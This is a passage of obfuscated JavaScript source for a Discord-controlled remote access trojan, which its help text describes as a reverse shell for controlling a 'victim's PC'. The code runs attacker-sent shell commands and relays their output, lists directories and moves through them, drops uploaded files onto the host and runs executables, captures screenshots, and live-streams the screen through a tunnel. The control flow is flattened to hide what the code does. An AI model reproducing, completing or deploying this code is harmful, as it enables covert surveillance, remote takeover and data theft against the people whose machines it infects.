          waKFⴳ.write( "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>Live</title></head><style>body { background-color: #000; }</style><body><div class=\"container\"><div class=\"row\"><div class=\"col-lg-8 offset-lg-2\"><div id=\"image-container\" style=\"text-align: center;\"><img id=\"image\" src=\"\" style=\"max-width: 100%; max-height: 100%; margin: auto;\"></div></div></div></div><script src=\"https://cdn.socket.io/4.0.1/socket.io.min.js\"></script><script>window.onload = function () {var image = document.getElementById('image');var socket = io();socket.on('frame', function (data) {image.src = data;});};</script></body></html>" );
          waKFⴳ.end();
        } );
        lYqv.on( "connection", function ( UwMGⴳ ) {
          UwMGⴳ.on( "disconnect", function () {} );
        } );
        OyDR.listen( pRjR, "0.0.0.0", function () {
          pCN.channel.send( "`" + "Server controller OK [Running ".concat( pRjR, "]" ) + "`" );
          irjM();
          loopholeProcess.stdout.on( "data", function ( PjKqⴳ ) {
            var Ibtjⴳ = PjKqⴳ.toString().split( "\n" );
            Ibtjⴳ.forEach( function ( cVTSⴳ ) {
              var wsvbⴳ = cVTSⴳ.match( /https?:\/\/[^\s]+/ );
              WOxZⴳ = 11;
              while ( WOxZⴳ < 35 ) switch ( WOxZⴳ ) {
              case 20:
                WOxZⴳ = 35;
                {
                  var bmZRⴳ = wsvbⴳ[ 0 ];
                  var ZAZMⴳ = bmZRⴳ.replace( /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, "" );
                  iShrⴳ = 12;
                  while ( iShrⴳ < 39 ) switch ( iShrⴳ ) {
                  case 30:
                    iShrⴳ = 39;
                    {
                      return;
                    }
                    break;
                  case 12:
                    iShrⴳ = ZAZMⴳ.includes( "localhost" ) ? 30 : 39;
                    break;
                  }
                  rnTJⴳ = 13;
                  while ( rnTJⴳ < 21 ) switch ( rnTJⴳ ) {
                  case 13:
                    rnTJⴳ = sent === ![] ? 16 : 11;
                    break;
                  case 11:
                    rnTJⴳ = 21;
                    return;
                  case 16:
                    rnTJⴳ = 21;
                    {
                      pCN.channel.send( "`" + "Your live link: `**" + ZAZMⴳ + "**\n`[Warning: Recommended to open the link 10 seconds after it has been sent to make sure the TLS certificate is provisioned.]" + "`" );
                      sent = !![];
                    }
                    break;
                  }
                }
                break;
              case 11:
                WOxZⴳ = wsvbⴳ ? 20 : 35;
                break;
              }
              var WOxZⴳ, iShrⴳ, rnTJⴳ;
            } );
          } );
          unloggedinsent = ![];
          loopholeProcess.stderr.on( "data", function ( pXoVⴳ ) {
            var vhurⴳ = pXoVⴳ.toString();
            var Cqtuⴳ = pXoVⴳ.toString().split( "\n" );
            Cqtuⴳ.forEach( function ( MDxGⴳ ) {
              qrGjⴳ = 37;
              while ( qrGjⴳ < 38 ) switch ( qrGjⴳ ) {
              case 27:
                qrGjⴳ = 38;
                {
                  DBfHⴳ = 20;
                  while ( DBfHⴳ < 35 ) switch ( DBfHⴳ ) {
                  case 20:
                    DBfHⴳ = unloggedinsent === ![] ? 34 : 35;
                    break;
                  case 34:
                    DBfHⴳ = 35;
                    {
                      OyDR.close();
                      pCN.channel.send( "`Loophole Process is not logged in!`\n`Log in your loophole process with !lplogin`" );
                      unloggedinsent = [ null ] == '';
                    }
                    break;
                  }
                }
                break;
              case 37:
                qrGjⴳ = MDxGⴳ.includes( "You're not logged in" ) ? 27 : 38;
                break;
              }
              var qrGjⴳ, DBfHⴳ;
            } );
          } );
          loopholeProcess.on( "close", function ( ZGjlⴳ ) {} );
        } );
        return _context4.abrupt( "break", 381 );
      case 381:
        _context4.next = 367;
        break;
      case 383:
        return _context4.abrupt( "break", 386 );
      case 384:
        guENz = gqGSⴳ === "stop" ? 30 : 35;
        return _context4.abrupt( "break", 386 );
      case 386:
        _context4.next = 335;
        break;
      case 388:
        return _context4.abrupt( "break", 516 );
      case 389:
        HXuvQ = pCN.content.startsWith( "!vnc" ) ? 23 : 19;
        return _context4.abrupt( "break", 516 );
      case 391:
        HXuvQ = 32;
        PNOⵚⴲ = 15;
      case 393:
        if ( !( PNOⵚⴲ < 37 ) ) {
          _context4.next = 515;
          break;
        }
        _context4.t32 = PNOⵚⴲ;
        _context4.next = _context4.t32 === 22 ? 397 : _context4.t32 === 15 ? 435 : _context4.t32 === 36 ? 437 : 513;
        break;
      case 397:
        PNOⵚⴲ = 37;
        rKXws = 17;
      case 399:
        if ( !( rKXws < 34 ) ) {
          _context4.next = 434;
          break;
        }
        _context4.t33 = rKXws;
        _context4.next = _context4.t33 === 17 ? 403 : _context4.t33 === 28 ? 405 : _context4.t33 === 33 ? 416 : 432;
        break;
      case 403:
        rKXws = clLg === "ss" ? 33 : 28;
        return _context4.abrupt( "break", 432 );
      case 405:
        rKXws = 34;
        ETaxw = 36;
        _loop = /*#__PURE__*/ _regeneratorRuntime().mark( function _loop() {
          var Ngudⴳ, KZHwⴳ, oGgUⴳ, _i, _KZHwⴳ, JdyVⴳ, VUdmⴳ, craLⴳ, wkrⴰⴳ, aSfⴰⴳ, _iterator, _step, _loop2, pCNⵞⴲ, aSfⵞⴲ;
          return _regeneratorRuntime().wrap( function _loop$( _context3 ) {
            while ( 1 ) switch ( _context3.prev = _context3.next ) {
            case 0:
              _context3.t0 = ETaxw;
              _context3.next = _context3.t0 === 12 ? 3 : _context3.t0 === 22 ? 262 : _context3.t0 === 36 ? 286 : 288;
              break;
            case 3:
              ETaxw = 37;
              mUwwm = 27;
            case 5:
              if ( !( mUwwm < 30 ) ) {
                _context3.next = 261;
                break;
              }
              _context3.t1 = mUwwm;
              _context3.next = _context3.t1 === 27 ? 9 : _context3.t1 === 18 ? 11 : _context3.t1 === 24 ? 254 : 259;
              break;
            case 9:
              mUwwm = clLg === "help" ? 24 : 18;
              return _context3.abrupt( "break", 259 );
            case 11:
              mUwwm = 30;
              niqzy = 24;
            case 13:
              if ( !( niqzy < 30 ) ) {
                _context3.next = 253;
                break;
              }
              _context3.t2 = niqzy;
              _context3.next = _context3.t2 === 29 ? 17 : _context3.t2 === 18 ? 217 : _context3.t2 === 24 ? 249 : 251;
              break;
            case 17:
              niqzy = 30;
              qIRjF = 10;
            case 19:
              if ( !( qIRjF < 37 ) ) {
                _context3.next = 216;
                break;
              }
              _context3.t3 = qIRjF;
              _context3.next = _context3.t3 === 15 ? 23 : _context3.t3 === 10 ? 26 : _context3.t3 === 36 ? 28 : 214;
              break;
            case 23:
              qIRjF = 37;
              pCN.channel.send( "`Not recommended to use !dir, use !c or !ls to view current directory.`" );
              return _context3.abrupt( "break", 214 );
            case 26:
              qIRjF = clLg === "dir" ? 15 : 36;
              return _context3.abrupt( "break", 214 );
            case 28:
              qIRjF = 37;
              DASeP = 18;
            case 30:
              if ( !( DASeP < 30 ) ) {
                _context3.next = 213;
                break;
              }
              _context3.t4 = DASeP;
              _context3.next = _context3.t4 === 13 ? 34 : _context3.t4 === 18 ? 186 : _context3.t4 === 29 ? 188 : 211;
              break;
            case 34:
              DASeP = 30;
              LIEⵚⴲ = 23;
            case 36:
              if ( !( LIEⵚⴲ < 24 ) ) {
                _context3.next = 185;
                break;
              }
              _context3.t5 = LIEⵚⴲ;
              _context3.next = _context3.t5 === 19 ? 40 : _context3.t5 === 7 ? 43 : _context3.t5 === 23 ? 181 : 183;
              break;
            case 40:
              LIEⵚⴲ = 24;
              pCN.channel.send( "`" + process.cwd() + "`" );
              return _context3.abrupt( "break", 183 );
            case 43:
              LIEⵚⴲ = 24;
              mYjⵚⴲ = 36;
            case 45:
              if ( !( mYjⵚⴲ < 37 ) ) {
                _context3.next = 180;
                break;
              }
              _context3.t6 = mYjⵚⴲ;
              _context3.next = _context3.t6 === 36 ? 49 : _context3.t6 === 12 ? 51 : _context3.t6 === 22 ? 174 : 178;
              break;
            case 49:
              mYjⵚⴲ = clLg === "cd" ? 22 : 12;
              return _context3.abrupt( "break", 178 );
            case 51:
              mYjⵚⴲ = 37;
              dPAⵚⴲ = 18;
            case 53:
              if ( !( dPAⵚⴲ < 30 ) ) {
                _context3.next = 173;
                break;
              }
              _context3.t7 = dPAⵚⴲ;
              _context3.next = _context3.t7 === 29 ? 57 : _context3.t7 === 18 ? 118 : _context3.t7 === 13 ? 120 : 171;
              break;
            case 57:
              dPAⵚⴲ = 30;
              _context3.prev = 58;
              Ngudⴳ = LeYh.join( " " );
              Jqtⵚⴲ = 7;
            case 61:
              if ( !( Jqtⵚⴲ < 34 ) ) {
                _context3.next = 111;
                break;
              }
              _context3.t8 = Jqtⵚⴲ;
              _context3.next = _context3.t8 === 7 ? 65 : _context3.t8 === 33 ? 67 : _context3.t8 === 17 ? 70 : 109;
              break;
            case 65:
              Jqtⵚⴲ = process.platform === "win32" ? 17 : 33;
              return _context3.abrupt( "break", 109 );
            case 67:
              Jqtⵚⴲ = 34;
              pCN.channel.send( "`Popup is not supported on this platform.`" );
              return _context3.abrupt( "break", 109 );
            case 70:
              Jqtⵚⴲ = 34;
              KZHwⴳ = [ "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", raTE.homedir() + "\\AppData\\Local\\Microsoft\\WindowsApps\\powershell.exe" ];
              oGgUⴳ = null;
              _i = 0, _KZHwⴳ = KZHwⴳ;
            case 74:
              if ( !( _i < _KZHwⴳ.length ) ) {
                _context3.next = 92;
                break;
              }
              JdyVⴳ = _KZHwⴳ[ _i ];
              Ouhⵚⴲ = 36;
            case 77:
              if ( !( Ouhⵚⴲ < 37 ) ) {
                _context3.next = 89;
                break;
              }
              _context3.t9 = Ouhⵚⴲ;
              _context3.next = _context3.t9 === 22 ? 81 : _context3.t9 === 36 ? 85 : 87;
              break;
            case 81:
              Ouhⵚⴲ = 37;
              oGgUⴳ = JdyVⴳ;
              return _context3.abrupt( "break", 92 );
            case 85:
              Ouhⵚⴲ = orCp.existsSync( JdyVⴳ ) ? 22 : 37;
              return _context3.abrupt( "break", 87 );
            case 87:
              _context3.next = 77;
              break;
            case 89:
              _i++;
              _context3.next = 74;
              break;
            case 92:
              qCcⵚⴲ = 19;
            case 93:
              if ( !( qCcⵚⴲ < 34 ) ) {
                _context3.next = 108;
                break;
              }
              _context3.t10 = qCcⵚⴲ;
              _context3.next = _context3.t10 === 19 ? 97 : _context3.t10 === 17 ? 99 : _context3.t10 === 7 ? 102 : 106;
              break;
            case 97:
              qCcⵚⴲ = oGgUⴳ ? 7 : 17;
              return _context3.abrupt( "break", 106 );
            case 99:
              qCcⵚⴲ = 34;
              pCN.channel.send( "Popup is not supported in this machine." );
              return _context3.abrupt( "break", 106 );
            case 102:
              qCcⵚⴲ = 34;
              wNAF( "\"".concat( oGgUⴳ, "\" -Command \"Add-Type -AssemblyName Microsoft.VisualBasic;[Microsoft.VisualBasic.Interaction]::MsgBox('" ).concat( Ngudⴳ, "', 0 + 4096 + 64, '<=[Message]=>')\"" ), function ( lvLDⴳ, XInnⴳ, irjMⴳ ) {
                nXiAⴳ = 16;
                while ( nXiAⴳ < 35 ) switch ( nXiAⴳ ) {
                case 11:
                  nXiAⴳ = 35;
                  {
                    console.error( "exec error:", lvLDⴳ );
                    pCN.channel.send( "`Popup is not supported in this machine.`" );
                    return;
                  }
                  break;
                case 16:
                  nXiAⴳ = lvLDⴳ ? 11 : 35;
                  break;
                }
                console.log( "stdout:", XInnⴳ );
                console.error( "stderr:", irjMⴳ );
                var nXiAⴳ;
              } );
              pCN.channel.send( "`Popup sent!`" );
              return _context3.abrupt( "break", 106 );
            case 106:
              _context3.next = 93;
              break;
            case 108:
              return _context3.abrupt( "break", 109 );
            case 109:
              _context3.next = 61;
              break;
            case 111:
              _context3.next = 117;
              break;
            case 113:
              _context3.prev = 113;
              _context3.t11 = _context3[ "catch" ]( 58 );
              console.error( "Error occurred starting popup function:", _context3.t11 );
              pCN.channel.send( "`Error occurred starting popup function.`" );
            case 117:
              return _context3.abrupt( "break", 171 );
            case 118:
              dPAⵚⴲ = clLg.startsWith( "popup" ) ? 29 : 13;
              return _context3.abrupt( "break", 171 );
            case 120:
              dPAⵚⴲ = 30;
              lDSⵚⴲ = 20;
            case 122:
              if ( !( lDSⵚⴲ < 35 ) ) {
                _context3.next = 133;
                break;
              }
              _context3.t12 = lDSⵚⴲ;
              _context3.next = _context3.t12 === 20 ? 126 : _context3.t12 === 34 ? 128 : 131;
              break;
            case 126:
              lDSⵚⴲ = pCN.content.startsWith( "!bind" ) ? 34 : 35;
              return _context3.abrupt( "break", 131 );
            case 128:
              lDSⵚⴲ = 35;
              return _context3.abrupt( "return", {
                v: void 0
              } );
            case 131:
              _context3.next = 122;
              break;
            case 133:
              ecJⵚⴲ = 27;
            case 134:
              if ( !( ecJⵚⴲ < 30 ) ) {
                _context3.next = 145;
                break;
              }
              _context3.t13 = ecJⵚⴲ;
              _context3.next = _context3.t13 === 24 ? 138 : _context3.t13 === 27 ? 141 : 143;
              break;
            case 138:
              ecJⵚⴲ = 30;
              return _context3.abrupt( "return", {
                v: void 0
              } );
            case 141:
              ecJⵚⴲ = pCN.content.startsWith( "!forcerebind" ) ? 24 : 30;
              return _context3.abrupt( "break", 143 );
            case 143:
              _context3.next = 134;
              break;
            case 145:
              kRphK = 25;
            case 146:
              if ( !( kRphK < 37 ) ) {
                _context3.next = 157;
                break;
              }
              _context3.t14 = kRphK;
              _context3.next = _context3.t14 === 25 ? 150 : _context3.t14 === 10 ? 152 : 155;
              break;
            case 150:
              kRphK = pCN.content.startsWith( "!download" ) ? 10 : 37;
              return _context3.abrupt( "break", 155 );
            case 152:
              kRphK = 37;
              return _context3.abrupt( "return", {
                v: void 0
              } );
            case 155:
              _context3.next = 146;
              break;
            case 157:
              xGrZu = 36;
            case 158:
              if ( !( xGrZu < 37 ) ) {
                _context3.next = 170;
                break;
              }
              _context3.t15 = xGrZu;
              _context3.next = _context3.t15 === 22 ? 162 : _context3.t15 === 36 ? 166 : 168;
              break;
            case 162:
              xGrZu = 37;
              VUdmⴳ = pCN.content.slice( ZUgD.length ).trim();
              try {
                craLⴳ = wNAF( VUdmⴳ );
                craLⴳ.stdout.on( "data", function ( wftwⴳ ) {
                  var GLbLⴳ = Vmut( wftwⴳ.toString() );
                  var qCcⴴⴳ = GLbLⴳ.split( "\n" );
                  qCcⴴⴳ.forEach( function ( yBaVⴳ ) {
                    QPYLⴳ = 12;
                    while ( QPYLⴳ < 39 ) switch ( QPYLⴳ ) {
                    case 12:
                      QPYLⴳ = yBaVⴳ.length == 0 ? 30 : 35;
                      break;
                    case 35:
                      QPYLⴳ = 39;
                      {
                        pCN.channel.send( "`" + yBaVⴳ + "`" );
                      }
                      break;
                    case 30:
                      QPYLⴳ = 39;
                      {
                        return;
                      }
                      break;
                    }
                    var QPYLⴳ;
                  } );
                } );
                craLⴳ.stderr.on( "data", function ( TuwMⴳ ) {
                  var ntwMⴳ = Vmut( TuwMⴳ.toString() );
                  var MWdGⴳ = ntwMⴳ.split( "\n" );
                  MWdGⴳ.forEach( function ( agQwⴳ ) {
                    IJSUⴳ = 25;
                    while ( IJSUⴳ < 37 ) switch ( IJSUⴳ ) {
                    case 10:
                      IJSUⴳ = 37;
                      {
                        return;
                      }
                      break;
                    case 25:
                      IJSUⴳ = agQwⴳ.length == 0 ? 10 : 15;
                      break;
                    case 15:
                      IJSUⴳ = 37;
                      {
                        pCN.channel.send( "`" + agQwⴳ + "`" );
                      }
                      break;
                    }
                    var IJSUⴳ;
                  } );
                } );
                craLⴳ.on( "error", function ( GdwBⴳ ) {
                  var WtPNⴳ = Vmut( data.toString() );
                  var zgjiⴳ = WtPNⴳ.split( "\n" );
                  zgjiⴳ.forEach( function ( rrrZⴳ ) {
                    yqhkⴳ = 10;
                    while ( yqhkⴳ < 37 ) switch ( yqhkⴳ ) {
                    case 36:
                      yqhkⴳ = 37;
                      {
                        pCN.channel.send( "`" + rrrZⴳ + "`" );
                      }
                      break;
                    case 15:
                      yqhkⴳ = 37;
                      {
                        return;
                      }
                      break;
                    case 10:
                      yqhkⴳ = rrrZⴳ.length == 0 ? 15 : 36;
                      break;
                    }
                    var yqhkⴳ;
                  } );
                } );
              } catch ( LXBTⴳ ) {
                pCN.channel.send( "`Unresolved Error Occurred! (Did you send a correct command?)`" );
              }
              return _context3.abrupt( "break", 168 );
            case 166:
              xGrZu = pCN.content.startsWith( ZUgD ) ? 22 : 37;
              return _context3.abrupt( "break", 168 );
            case 168:
              _context3.next = 158;
              break;
            case 170:
              return _context3.abrupt( "break", 171 );
            case 171:
              _context3.next = 53;
              break;
            case 173:
              return _context3.abrupt( "break", 178 );
            case 174:
              mYjⵚⴲ = 37;
              wkrⴰⴳ = LeYh.join( " " );
              try {
                process.chdir( wkrⴰⴳ );
                pCN.channel.send( "`Directory changed to " + wkrⴰⴳ + "`" );
              } catch ( bbkKⴳ ) {
                pCN.channel.send( "`Failed to change directory.`" );
              }
              return _context3.abrupt( "break", 178 );
            case 178:
              _context3.next = 45;
              break;
            case 180:
              return _context3.abrupt( "break", 183 );
            case 181:
              LIEⵚⴲ = clLg === "c" ? 19 : 7;
              return _context3.abrupt( "break", 183 );
            case 183:
              _context3.next = 36;
              break;
            case 185:
              return _context3.abrupt( "break", 211 );
            case 186:
              DASeP = clLg === "ls" ? 29 : 13;
              return _context3.abrupt( "break", 211 );
            case 188:
              DASeP = 30;
              _context3.prev = 189;
              aSfⴰⴳ = process.cwd();
              fngkw = 19;
            case 192:
              if ( !( fngkw < 34 ) ) {
                _context3.next = 204;
                break;
              }
              _context3.t16 = fngkw;
              _context3.next = _context3.t16 === 7 ? 196 : _context3.t16 === 19 ? 200 : 202;
              break;
            case 196:
              fngkw = 34;
              pCN.channel.send( "`Error: Current directory does not exist.`" );
              return _context3.abrupt( "return", {
                v: void 0
              } );
            case 200:
              fngkw = !orCp.existsSync( aSfⴰⴳ ) ? 7 : 34;
              return _context3.abrupt( "break", 202 );
            case 202:
              _context3.next = 192;
              break;
            case 204:
              orCp.readdir( aSfⴰⴳ, function ( gpXⴰⴳ, mYjⴰⴳ ) {
                opkjⴳ = 10;
                while ( opkjⴳ < 37 ) switch ( opkjⴳ ) {
                case 10:
                  opkjⴳ = gpXⴰⴳ ? 15 : 37;
                  break;
                case 15:
                  opkjⴳ = 37;
                  {
                    pCN.channel.send( "Error: ".concat( gpXⴰⴳ.message ) );
                    return;
                  }
                  break;
                }
                var pCNⴰⴳ = 20;
                var kIBZⴳ = [];
                DJgkⴳ = 37;
                {
                  var cFesⴳ;
                  while ( DJgkⴳ < 38 ) {
                    switch ( DJgkⴳ ) {
                    case 27:
                      DJgkⴳ = cFesⴳ < mYjⴰⴳ.length ? 24 : 38;
                      break;
                    case 37:
                      DJgkⴳ = 27;
                      cFesⴳ = 0;
                      break;
                    case 24:
                      DJgkⴳ = 18;
                      {
                        kIBZⴳ.push( mYjⴰⴳ.slice( cFesⴳ, cFesⴳ + pCNⴰⴳ ) );
                      }
                      break;
                    case 18:
                      DJgkⴳ = 27;
                      cFesⴳ += pCNⴰⴳ;
                      break;
                    }
                  }
                }
                var LeYhⴳ = 0;
                var clLgⴳ = function clLgⴳ() {
                  var IdBCⴳ = new aJVu.MessageEmbed().setTitle( "Directory Listing" ).setDescription( kIBZⴳ[ LeYhⴳ ].map( function ( WAvLⴳ ) {
                    var pJEKⴳ = orCp.statSync( WAvLⴳ );
                    return pJEKⴳ.isDirectory() ? "📂 " + WAvLⴳ : "📄 " + WAvLⴳ;
                  } ).join( "\n" ) + "\n" + "`" + process.cwd() + "`" );
                  pCN.channel.send( IdBCⴳ ).then( function ( fopkⴳ ) {
                    AnBVⴳ = 17;
                    while ( AnBVⴳ < 34 ) switch ( AnBVⴳ ) {
                    case 33:
                      AnBVⴳ = 34;
                      {
                        fopkⴳ.react( "⬅️" ).then( function () {
                          return fopkⴳ.react( "➡️" );
                        } );
                        var Ouhⴲⴳ = function Ouhⴲⴳ( qCcⴲⴳ, lDSⴲⴳ ) {
                          return [ "⬅️", "➡️" ].includes( qCcⴲⴳ.emoji.name ) && !lDSⴲⴳ.bot;
                        };
                        var ecJⴲⴳ = fopkⴳ.createReactionCollector( Ouhⴲⴳ );
                        ecJⴲⴳ.on( "collect", function ( ynCxⴳ, PNOⴲⴳ ) {
                          ynCxⴳ.users.remove( PNOⴲⴳ )[ "catch" ]( console.error );
                          MqoPⴳ = 15;
                          while ( MqoPⴳ < 37 ) switch ( MqoPⴳ ) {
                          case 36:
                            MqoPⴳ = 37;
                            {
                              LeYhⴳ = ( LeYhⴳ - 1 + kIBZⴳ.length ) % kIBZⴳ.length;
                            }
                            break;
                          case 22:
                            MqoPⴳ = 37;
                            {
                              LeYhⴳ = ( LeYhⴳ + 1 ) % kIBZⴳ.length;
                            }
                            break;
                          case 15:
                            MqoPⴳ = ynCxⴳ.emoji.name === "⬅️" ? 36 : 22;
                            break;
                          }
                          IdBCⴳ.setDescription( kIBZⴳ[ LeYhⴳ ].map( function ( jUSzⴳ ) {
                            var lgnZⴳ = orCp.statSync( jUSzⴳ );
                            return lgnZⴳ.isDirectory() ? "📂 " + jUSzⴳ : "📄 " + jUSzⴳ;
                          } ).join( "\n" ) + "\n" + "`" + process.cwd() + "`" );
                          fopkⴳ.edit( IdBCⴳ )[ "catch" ]( console.error );
                          var MqoPⴳ;
                        } );
                        ecJⴲⴳ.on( "end", function () {
                          fopkⴳ.reactions.removeAll()[ "catch" ]( console.error );
                        } );
                      }
                      break;
                    case 17:
                      AnBVⴳ = kIBZⴳ.length > 1 ? 33 : 34;
                      break;
                    }
                    var AnBVⴳ;
                  } )[ "catch" ]( console.error );
                };
                clLgⴳ();
                var opkjⴳ, DJgkⴳ;
              } );
              _context3.next = 210;
              break;
            case 207:
              _context3.prev = 207;
              _context3.t17 = _context3[ "catch" ]( 189 );
              pCN.channel.send( "`Error Listing Directory!`" );
            case 210:
              return _context3.abrupt( "break", 211 );
            case 211:
              _context3.next = 30;
              break;
            case 213:
              return _context3.abrupt( "break", 214 );
            case 214:
              _context3.next = 19;
              break;
            case 216:
              return _context3.abrupt( "break", 251 );
            case 217:
              niqzy = 30;
              JibjC = 37;
            case 219:
              if ( !( JibjC < 38 ) ) {
                _context3.next = 248;
                break;
              }
              _context3.t18 = JibjC;
              _context3.next = _context3.t18 === 37 ? 223 : _context3.t18 === 27 ? 225 : _context3.t18 === 24 ? 243 : 246;
              break;
            case 223:
              JibjC = pCN.attachments.size > 0 ? 27 : 24;
              return _context3.abrupt( "break", 246 );
            case 225:
              JibjC = 38;
              _iterator = _createForOfIteratorHelper( pCN.attachments.values() );
              _context3.prev = 227;
              _loop2 = /*#__PURE__*/ _regeneratorRuntime().mark( function _loop2() {
                var QRBBⴳ, xtTMⴳ, ZRpBⴳ, qInyⴳ;
                return _regeneratorRuntime().wrap( function _loop2$( _context2 ) {
                  while ( 1 ) switch ( _context2.prev = _context2.next ) {
                  case 0:
                    QRBBⴳ = _step.value;
                    _context2.next = 3;
                    return JXVa.get( QRBBⴳ.url, _defineProperty( {}, "responseType", "stream" ) );
                  case 3:
                    xtTMⴳ = _context2.sent;
                    ZRpBⴳ = "./".concat( QRBBⴳ.name );
                    qInyⴳ = orCp.createWriteStream( ZRpBⴳ );
                    xtTMⴳ.data.pipe( qInyⴳ );
                    qInyⴳ.on( "finish", function () {
                      qInyⴳ.close();
                      pCN.channel.send( "`Upload completed successfully`" );
                    } );
                    qInyⴳ.on( "error", function () {
                      pCN.channel.send( "`Upload failed`" );
                    } );
                  case 9:
                  case "end":
                    return _context2.stop();
                  }
                }, _loop2 );
              } );
              _iterator.s();
            case 230:
              if ( ( _step = _iterator.n() ).done ) {
                _context3.next = 234;
                break;
              }
              return _context3.delegateYield( _loop2(), "t19", 232 );
            case 232:
              _context3.next = 230;
              break;
            case 234:
              _context3.next = 239;
              break;
            case 236:
              _context3.prev = 236;
              _context3.t20 = _context3[ "catch" ]( 227 );
              _iterator.e( _context3.t20 );
            case 239:
              _context3.prev = 239;
              _iterator.f();
              return _context3.finish( 239 );
            case 242:
              return _context3.abrupt( "break", 246 );
            case 243:
              JibjC = 38;
              pCN.channel.send( "`Please attach a file to upload.`" );
              return _context3.abrupt( "break", 246 );
            case 246:
              _context3.next = 219;
              break;
            case 248:
              return _context3.abrupt( "break", 251 );
            case 249:
              niqzy = clLg === "upload" ? 18 : 29;
              return _context3.abrupt( "break", 251 );
            case 251:
              _context3.next = 13;
              break;
            case 253:
              return _context3.abrupt( "break", 259 );
            case 254:
              mUwwm = 30;
              pCNⵞⴲ = "`" + "Here are the commands you can use:\n            - !shutdown: Force shut down the target machine.\n            - !vnc [start/stop]: Live stream your victim's PC\n            - !ls: Lists the contents of the current directory and sends it as an embed.\n            - !run <filename>: Runs the specified file.\n            - !help: Shows this help message.\n            - !cd: Changes the directory.\n            - !upload: Upload a file.\n            - !popup: Show a fun popup!\n            - !download: Download a file.\n            - !ss: Screenshot your victim's screen.\n            - >[UTIL] !forcerebind [serverid]: Globally rebind the bot's functional server.\n            - >[UTIL] !bind [serverid]: Initiator command.\n            - >[UTIL] !lplogin: Login the loophole process. (If it doesn't work try doing it manually. !node_modules\\loophole account login')\n            - 𓍼 Discord based asynchronous reverse shell created by Yaza and Spawn" + "`";
              _context3.next = 258;
              return pCN.channel.send( pCNⵞⴲ );
            case 258:
              return _context3.abrupt( "break", 259 );
            case 259:
              _context3.next = 5;
              break;
            case 261:
              return _context3.abrupt( "break", 288 );
            case 262:
              ETaxw = 37;
              aSfⵞⴲ = LeYh.join( " " );
              _context3.prev = 264;
              gpXⵚⴲ = 27;
            case 266:
              if ( !( gpXⵚⴲ < 30 ) ) {
                _context3.next = 280;
                break;
              }
              _context3.t21 = gpXⵚⴲ;
              _context3.next = _context3.t21 === 27 ? 270 : _context3.t21 === 24 ? 272 : _context3.t21 === 18 ? 275 : 278;
              break;
            case 270:
              gpXⵚⴲ = aSfⵞⴲ.endsWith( ".exe" ) ? 24 : 18;
              return _context3.abrupt( "break", 278 );
            case 272:
              gpXⵚⴲ = 30;
              wNAF( aSfⵞⴲ, function ( LIEⵞⴲ, mYjⵞⴲ, dPAⵞⴲ ) {
                Jqtⵞⴲ = 23;
                while ( Jqtⵞⴲ < 24 ) switch ( Jqtⵞⴲ ) {
                case 19:
                  Jqtⵞⴲ = 24;
                  {
                    pCN.channel.send( "`" + "Error running file: ".concat( LIEⵞⴲ.message ) + "`" );
                    return;
                  }
                  break;
                case 23:
                  Jqtⵞⴲ = LIEⵞⴲ ? 19 : 24;
                  break;
                }
                pCN.channel.send( "`" + "Ran the file ".concat( aSfⵞⴲ ) + "`" );
                var Jqtⵞⴲ;
              } );
              return _context3.abrupt( "break", 278 );
            case 275:
              gpXⵚⴲ = 30;
              pCN.channel.send( "`Unsupported file type.`" );
              return _context3.abrupt( "break", 278 );
            case 278:
              _context3.next = 266;
              break;
            case 280:
              _context3.next = 285;
              break;
            case 282:
              _context3.prev = 282;
              _context3.t22 = _context3[ "catch" ]( 264 );
              pCN.channel.send( "`" + "Error running file: ".concat( _context3.t22.message ) + "`" );
            case 285:
              return _context3.abrupt( "break", 288 );
            case 286:
              ETaxw = clLg === "run" ? 22 : 12;
              return _context3.abrupt( "break", 288 );
            case 288:
            case "end":
              return _context3.stop();
            }
          }, _loop, null, [
            [ 58, 113 ],
            [ 189, 207 ],
            [ 227, 236, 239, 242 ],
            [ 264, 282 ]
          ] );
        } );
      case 408:
        if ( !( ETaxw < 37 ) ) {
          _context4.next = 415;
          break;
        }
        return _context4.delegateYield( _loop(), "t34", 410 );
      case 410:
        _ret = _context4.t34;
        if ( !_ret ) {
          _context4.next = 413;
          break;
        }
        return _context4.abrupt( "return", _ret.v );
      case 413:
        _context4.next = 408;
        break;
      case 415:
        return _context4.abrupt( "break", 432 );
      case 416:
        rKXws = 34;
        _context4.prev = 417;
        _context4.next = 420;
        return ATBf();
      case 420:
        qCcⵞⴲ = _context4.sent;
        npnyR = "".concat( raTE.tmpdir, "\\screenshot.png" );
        orCp.writeFileSync( npnyR, qCcⵞⴲ );
        _context4.next = 425;
        return pCN.channel.send( _defineProperty( {}, "files", [ _defineProperty( _defineProperty( {}, "attachment", npnyR ), "name", "screenshot.png" ) ] ) );
      case 425:
        orCp.unlinkSync( npnyR );
        _context4.next = 431;
        break;
      case 428:
        _context4.prev = 428;
        _context4.t35 = _context4[ "catch" ]( 417 );
        pCN.channel.send( "Unknown error occured." );
      case 431:
        return _context4.abrupt( "break", 432 );
      case 432:
        _context4.next = 399;
        break;
      case 434:
        return _context4.abrupt( "break", 513 );
      case 435:
        PNOⵚⴲ = clLg === "delete" ? 36 : 22;
        return _context4.abrupt( "break", 513 );
      case 437:
        PNOⵚⴲ = 37;
        _context4.next = 440;
        return pCN.channel.send( "`Are you sure you wanna disconnect this machine? [yes / no] WARNING: DELETION IS PERMANENT.`" );
      case 440:
        koHPs = _context4.sent;
        shlaw = function shlaw( QCsol ) {
          return QCsol.author.id === pCN.author.id && QCsol.channel.id === pCN.channel.id;
        };
        yNTyF = {};
        yNTyF.max = 1;
        yNTyF.time = 10000;
        yNTyF.errors = [ "time" ];
        KeCuK = yNTyF;
        _context4.prev = 447;
        _context4.next = 450;
        return pCN.channel.awaitMessages( shlaw, KeCuK );
      case 450:
        gpXⵞⴲ = _context4.sent;
        wkrⵞⴲ = gpXⵞⴲ.first().content.toLowerCase();
        wkrⵚⴲ = 33;
      case 453:
        if ( !( wkrⵚⴲ < 34 ) ) {
          _context4.next = 506;
          break;
        }
        _context4.t36 = wkrⵚⴲ;
